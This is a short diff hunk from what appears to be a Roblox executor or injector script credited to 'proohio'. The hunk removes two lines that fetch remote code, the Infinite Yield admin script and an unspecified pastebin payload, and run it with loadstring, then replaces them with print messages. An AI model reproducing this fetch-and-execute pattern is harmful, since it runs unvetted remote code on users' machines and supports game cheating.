@@ -649,9 +649,8 @@ end
 
 task.spawn(function()
 	print("proohio injected")
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-	loadstring(game:HttpGet("https://pastebin.com/raw/6bzurTbA"))()
-
+	print("credits for proohio for the injection")
+	print("welcome to web executor by proohio")
 	local _game = game:GetService("CoreGui").Parent
 local HttpService = _game:FindService("HttpService")
 
